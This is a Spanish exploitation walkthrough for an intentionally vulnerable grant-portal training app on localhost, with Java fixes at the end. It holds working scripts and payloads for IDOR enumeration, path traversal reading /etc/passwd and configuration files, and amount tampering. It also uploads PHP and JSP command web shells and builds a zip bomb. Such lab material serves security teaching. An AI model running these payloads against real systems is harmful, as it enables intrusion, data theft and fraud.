# Guía de Explotación de Vulnerabilidades
## Portal de Subvenciones - Aplicación Vulnerable

Este documento proporciona guías paso a paso para explotar cada una de las vulnerabilidades en la aplicación.

---

## 🎯 IDOR - Insecure Direct Object References

### ¿Qué es?
IDOR ocurre cuando una aplicación expone referencias a objetos (como IDs) sin validar que el usuario tiene permiso para accederlos.

### Vulnerabilidad en la Aplicación
El endpoint `/solicitudes/detalle/{id}` no verifica que la solicitud pertenezca al usuario autenticado.

### Pasos para Explotar

#### Método 1: Cambiar ID en la URL (Más Simple)

1. **Abre dos navegadores o sesiones**:
    - Sesión A: Inicia como `usuario1` (contraseña: `pass123`)
    - Sesión B: Abre incógnito e inicia como `usuario2` (contraseña: `pass123`)

2. **En Sesión A**:
    - Ve a Dashboard
    - Haz clic en "Nueva Solicitud"
    - Crea una solicitud: "Ayuda Especial Usuario 1"
    - Haz clic en "Ver" → Anota el ID en la URL (ej: `...detalle/1`)

3. **En Sesión B**:
    - Ve a Dashboard
    - Crea una solicitud: "Solicitud Usuario 2"
    - Anota su ID (debería ser 2 o superior)

4. **Explotación**:
    - En Sesión B, en la barra de direcciones, modifica la URL:
        - Original: `http://localhost:8080/solicitudes/detalle/2`
        - Cambia a: `http://localhost:8080/solicitudes/detalle/1`
    - ¡Verás la solicitud de usuario1 que no debería ser visible!

#### Método 2: Usar Burp Suite

1. **Abre Burp Suite Community**
2. **Configura Burp como proxy del navegador**
3. **Inicia sesión como usuario1**
4. **Accede a una solicitud y ve su detalle**
5. **Intercepta la solicitud en Burp Suite**
6. **En el Intercept, copia el ID**
7. **Cambia a otro usuario en navegador incógnito**
8. **Repite los pasos y captura su solicitud**
9. **En Burp, intercambia los IDs y Forward**
10. **Verás la solicitud del otro usuario**

#### Método 3: Incrementar IDs (Fuerza Bruta)

```python
import requests
from requests.auth import HTTPBasicAuth

# Headers con cookie de sesión (obtén de navegador)
headers = {
    'Cookie': 'JSESSIONID=tu_session_id_aqui'
}

# Probar IDs del 1 al 100
for solicitud_id in range(1, 101):
    url = f"http://localhost:8080/solicitudes/detalle/{solicitud_id}"
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200 and "Solicitud" in response.text:
        print(f"[+] Solicitud {solicitud_id} accesible!")
        # Guardar o analizar respuesta
```

### Impacto Demostrado
- ✅ Viste solicitudes confidenciales de otros usuarios
- ✅ Accediste a datos financieros (montos, ingresos)
- ✅ Obtuviste información personal (DNI, teléfono, dirección)
- ✅ Pudiste descargar documentos de otros usuarios

---

## 🔓 LFI - Local File Inclusion

### ¿Qué es?
LFI permite a un atacante incluir/descargar archivos del servidor sin autorización, típicamente usando secuencias como `../` para navegar fuera del directorio permitido.

### Vulnerabilidades en la Aplicación

#### Vulnerabilidad 1: Endpoint `/descargar`
El parámetro `archivo` no valida path traversal.

#### Vulnerabilidad 2: Endpoint `/config`
Permite descargar cualquier archivo del servidor.

### Pasos para Explotar

#### Nivel 1: Descargar application.properties

1. **Inicia sesión como cualquier usuario**
2. **En la URL, accede a**:
   ```
   http://localhost:8080/solicitudes/descargar?archivo=../application.properties
   ```
3. **¡Obtendrás el archivo de configuración con información sensible!**

#### Nivel 2: Acceder al Código Fuente

```
http://localhost:8080/solicitudes/descargar?archivo=../../../src/main/java/com/educativo/subvenciones/controller/LoginController.java
```

#### Nivel 3: Acceder a Archivos del Sistema

```bash
# En Linux/Mac:
http://localhost:8080/solicitudes/descargar?archivo=../../../etc/passwd

# En Windows:
http://localhost:8080/solicitudes/descargar?archivo=..\..\..\..\windows\win.ini
```

#### Método 2: Usar curl

```bash
# Desde terminal, obtén una cookie primero
curl -c cookies.txt -d "username=usuario1&password=pass123" http://localhost:8080/login

# Luego descarga el archivo
curl -b cookies.txt "http://localhost:8080/solicitudes/descargar?archivo=../application.properties" -o config.txt

cat config.txt
```

#### Método 3: Script de Python

```python
import requests
import sys
from urllib.parse import quote

# Crea sesión
session = requests.Session()

# Login
login_data = {
    'username': 'usuario1',
    'password': 'pass123'
}
session.post('http://localhost:8080/login', data=login_data)

# Archivos a intentar descargar
archivos = [
    '../application.properties',
    '../../../etc/passwd',
    '../../pom.xml',
    '../../../application.yml',
]

for archivo in archivos:
    try:
        url = f"http://localhost:8080/solicitudes/descargar?archivo={quote(archivo)}"
        response = session.get(url)
        
        if response.status_code == 200:
            print(f"\n[+] ARCHIVO ENCONTRADO: {archivo}")
            print("=" * 50)
            print(response.text[:500])
            print("=" * 50)
        else:
            print(f"[-] {archivo} - HTTP {response.status_code}")
    except Exception as e:
        print(f"[!] Error con {archivo}: {e}")
```

#### Método 4: Usar Burp Suite

1. **Abre Burp Suite Community**
2. **Configura como proxy**
3. **Inicia sesión en la aplicación**
4. **Crea una solicitud y adjunta un archivo**
5. **En Burp, intercepta la descarga y modifica**:
   ```
   GET /solicitudes/descargar?archivo=test.pdf
   ```
   Cambia a:
   ```
   GET /solicitudes/descargar?archivo=../application.properties
   ```
6. **Forward y recibe el archivo**

### Información Sensible que Puedes Obtener

1. **application.properties**:
    - Contraseña de base de datos
    - Claves secretas
    - URLs internas
    - Configuración del servidor

2. **Código Fuente**:
    - Lógica de negocio
    - Otras vulnerabilidades
    - Credenciales hardcodeadas

3. **Archivos del Sistema**:
    - /etc/passwd (usuarios del sistema)
    - /etc/shadow (hashes de contraseñas - si tienes permisos)
    - /proc/self/environ (variables de entorno)

### Validación de la Explotación
- ✅ Descargaste `application.properties`
- ✅ Encontraste strings de conexión a BD
- ✅ Obtuviste código fuente
- ✅ Accediste a archivos del SO

---

## 🎮 Manipulación de Parámetros

### ¿Qué es?
Modificar parámetros enviados por el cliente para alterar el comportamiento de la aplicación.

### Vulnerabilidad en la Aplicación
El endpoint `/solicitudes/resolver/{id}` acepta cualquier estado y monto sin validar.

### Pasos para Explotar

#### Escenario 1: Cambiar Montos de Aprobación

**Opción A: Modificar directamente en la web**

1. **Inicia como ADMIN** (usuario: `admin`, contraseña: `admin123`)
2. **Ve a Dashboard → Buscar Solicitudes**
3. **Busca una solicitud PENDIENTE**
4. **Abre su detalle**
5. **Abre las herramientas de desarrollo (F12)**
6. **Ve a la pestaña "Elementos"**
7. **Encuentra el input `montoAprobado`** con valor original (ej: 5000)
8. **Cambia el valor a uno mucho mayor** (ej: 50000)
9. **Haz clic en "Guardar Cambios"**
10. **¡La solicitud se aprobará por 50000€ en lugar de 5000€!**

**Opción B: Usar Burp Suite**

1. **Abre Burp Suite Community**
2. **Inicia como ADMIN**
3. **Intercept está activado**
4. **Haz clic en "Guardar Cambios" en una solicitud**
5. **En Burp, modifica el body**:
   ```
   Antes:
   nuevoEstado=APROBADA&montoAprobado=5000&razonRechazo=

   Después:
   nuevoEstado=APROBADA&montoAprobado=999999&razonRechazo=
   ```
6. **Forward y verás el monto modificado**

**Opción C: Usar curl**

```bash
# Obtén una sesión
curl -c cookies.txt -d "username=admin&password=admin123" http://localhost:8080/login

# Aprueba una solicitud con monto modificado
curl -b cookies.txt -X POST \
  -d "nuevoEstado=APROBADA&montoAprobado=999999&razonRechazo=Aprobado" \
  http://localhost:8080/solicitudes/resolver/1
```

#### Escenario 2: Enviar Estados Inválidos

1. **Como ADMIN, accede a una solicitud**
2. **Abre Developer Tools (F12)**
3. **Accede a la Consola**
4. **Ejecuta un script para enviar un estado inválido**:

```javascript
// En la consola de Firefox/Chrome
fetch('/solicitudes/resolver/1', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'nuevoEstado=SUPER_APROBADA&montoAprobado=1000000&razonRechazo=HACKED'
})
.then(r => r.text())
.then(html => {
    console.log('Solicitud enviada');
    window.location.reload();
});
```

#### Escenario 3: Script Python para Automatizar

```python
import requests

# Login
session = requests.Session()
login_url = 'http://localhost:8080/login'
login_data = {
    'username': 'admin',
    'password': 'admin123'
}

session.post(login_url, data=login_data)

# Modificar solicitud 1
resolver_url = 'http://localhost:8080/solicitudes/resolver/1'
malicious_data = {
    'nuevoEstado': 'APROBADA',
    'montoAprobado': '9999999',  # Monto fraudulento
    'razonRechazo': ''
}

response = session.post(resolver_url, data=malicious_data)

if response.status_code == 200:
    print("[+] Solicitud modificada con éxito!")
    print("[+] Monto fraudulento: 9999999€")
else:
    print("[-] Error en la solicitud")
```

### Impacto Demostrado
- ✅ Aprobaste montos más altos que lo solicitado
- ✅ Enviaste estados que no existen en el sistema
- ✅ Modificaste los datos sin validación
- ✅ Podrías hacer que desaprobados se aprueben

---

## 📤 Subida de Archivos Sin Validación

### ¿Qué es?
Permite a atacantes subir archivos peligrosos sin validación de tipo, contenido o nombre.

### Vulnerabilidades en la Aplicación
El endpoint `/solicitudes/crear` no valida:
- Tipo de archivo
- Contenido del archivo
- Nombre del archivo (permite path traversal)

### Pasos para Explotar

#### Escenario 1: Subida de Archivo Ejecutable

1. **Inicia como cualquier usuario**
2. **Ve a "Nueva Solicitud"**
3. **Crea un archivo malicioso** (por ejemplo, un script shell):
   ```bash
   #!/bin/bash
   cat /etc/passwd > /uploads/pwd.txt
   ```

4. **Guarda como**: `malicious.sh`
5. **Adjúntalo a la solicitud**
6. **Envía la solicitud**
7. **El archivo se sube sin validación**

#### Escenario 2: Path Traversal en Nombre de Archivo

**Usando formulario web con modificación JavaScript**:

```javascript
// Abre la consola (F12) en la página de nueva solicitud
document.querySelector('input[name="archivo"]').value = '';

// Crea un archivo fake
const canvas = document.createElement('canvas');
canvas.width = 100;
canvas.height = 100;
const file = new File(['TEST CONTENT'], '../shell.jsp', {type: 'text/plain'});

// Cambia el input
const input = document.querySelector('input[name="archivo"]');
const dt = new DataTransfer();
dt.items.add(file);
input.files = dt.files;
```

#### Escenario 3: Doble Extensión

1. **Crea un archivo**: `shell.php.pdf`
2. **Algunos servidores lo ejecutarán como PHP**
3. **Sube el archivo**

#### Escenario 4: Archivo Zip Bomb

```bash
# Crea un zip bomb (archivo que explota al extraerse)
# Este es un archivo pequeño pero que descomprime a tamaño ENORME

# Advertencia: Úsalo solo en testing
dd if=/dev/zero bs=1M count=1000 | zip -q - > bomb.zip

# Sube el archivo
```

#### Escenario 5: Usar Burp Suite

1. **Intercepta una solicitud de creación**
2. **En el multi-part form-data:**
   ```
   --boundary
   Content-Disposition: form-data; name="archivo"; filename="shell.php"
   Content-Type: application/octet-stream

   <?php system($_GET['cmd']); ?>
   --boundary
   ```

3. **Cambia `filename` a**: `../../../shell.jsp`
4. **Forward y el archivo se sube con path traversal**

#### Escenario 6: Script Python para Automatizar

```python
import requests
import io

# Login
session = requests.Session()
session.post('http://localhost:8080/login', data={
    'username': 'usuario1',
    'password': 'pass123'
})

# Crear un archivo malicioso
malicious_content = b"""
<% 
    Runtime.getRuntime().exec(request.getParameter("cmd"));
%>
"""

# Preparar solicitud con archivo
files = {
    'archivo': ('../../shell.jsp', io.BytesIO(malicious_content), 'text/plain')
}

data = {
    'titulo': 'Solicitud normal',
    'descripcion': 'Descripción',
    'montoSolicitado': 5000,
    'categoria': 'Educación',
    'ingresoMensual': 1000,
    'situacionLaboral': 'Desempleado',
    'miembrosFamilia': 2
}

response = session.post('http://localhost:8080/solicitudes/crear', 
                        files=files, data=data)

if response.status_code == 200:
    print("[+] Archivo subido (posiblemente fuera del directorio seguro)")
else:
    print("[-] Error en subida")
```

### Qué Puedes Conseguir

1. **Ejecución de código remoto**:
    - Subir un .jsp con código Java
    - Subir un .php con código PHP
    - Ejecutar comandos del sistema

2. **Denial of Service**:
    - Zip bombs
    - Archivos enormes
    - Agotar almacenamiento

3. **Sobrescritura de archivos**:
    - Sobreescribir archivos existentes
    - Dañar la aplicación

### Validación de Explotación
- ✅ Subiste un archivo ejecutable
- ✅ Subiste un archivo fuera del directorio permitido
- ✅ Obtuviste acceso potencial al servidor

---

## 🔍 Combinación de Vulnerabilidades

### Exploit Combinado: IDOR + LFI

```python
import requests

session = requests.Session()

# 1. Login
session.post('http://localhost:8080/login', data={
    'username': 'usuario1',
    'password': 'pass123'
})

# 2. Usar IDOR para encontrar solicitudes con archivos
for solicitud_id in range(1, 20):
    response = session.get(f'http://localhost:8080/solicitudes/detalle/{solicitud_id}')
    if 'nombreArchivo' in response.text:
        print(f"[+] Solicitud {solicitud_id} tiene archivo")
        
        # 3. Usar LFI para descargar el archivo de otro usuario
        archivo = response.text.split('nombreArchivo')[1].split('>')[1]
        print(f"[+] Archivo: {archivo}")
        
        # 4. Intentar descargar con path traversal
        download_url = f'http://localhost:8080/solicitudes/descargar?archivo=../{archivo}'
        file_response = session.get(download_url)
        print(f"[+] Archivo descargado: {len(file_response.content)} bytes")
```

---

## 🛡️ Defensas Pasadas

Ahora que has explotado las vulnerabilidades, intenta arreglarias:

### 1. Arreglar IDOR
```java
// Validar que el usuario es propietario
if (!"ADMIN".equals(rol)) {
    if (!solicitud.get().getUsuario().getId().equals(usuarioId)) {
        throw new AccessDeniedException("Acceso denegado");
    }
}
```

### 2. Arreglar LFI
```java
Path basePath = Paths.get(UPLOAD_DIR).toAbsolutePath();
Path filePath = basePath.resolve(archivo).toAbsolutePath().normalize();

if (!filePath.startsWith(basePath)) {
    throw new SecurityException("Path traversal detected");
}
```

### 3. Arreglar Manipulación de Parámetros
```java
List<String> validStates = Arrays.asList("PENDIENTE", "APROBADA", "DENEGADA");
if (!validStates.contains(nuevoEstado)) {
    throw new IllegalArgumentException("Estado inválido");
}
```

### 4. Arreglar Subida de Archivos
```java
String[] allowedExtensions = {".pdf", ".doc", ".docx", ".jpg", ".png"};
String extension = fileName.substring(fileName.lastIndexOf("."));

if (!Arrays.asList(allowedExtensions).contains(extension.toLowerCase())) {
    throw new IllegalArgumentException("Tipo no permitido");
}

// Renombrar archivo
String safeName = UUID.randomUUID() + extension;
```

---

## 📊 Resumen de Explotaciones

| Vulnerabilidad | Facilidad | Impacto | Exploración |
|---|---|---|---|
| IDOR | ⭐⭐ (Muy Fácil) | ⭐⭐⭐ (Alto) | Cambiar ID en URL |
| LFI | ⭐⭐⭐ (Fácil) | ⭐⭐⭐⭐ (Muy Alto) | Path traversal ../../../ |
| Param Tampering | ⭐ (Trivial) | ⭐⭐⭐ (Alto) | DevTools, Burp Suite |
| File Upload | ⭐⭐ (Fácil) | ⭐⭐⭐⭐ (Muy Alto) | Subir ejecutables |

---

**⚠️ Recuerda**: Estas técnicas son solo para educación y testing autorizado. El uso no autorizado de estas técnicas es ILEGAL.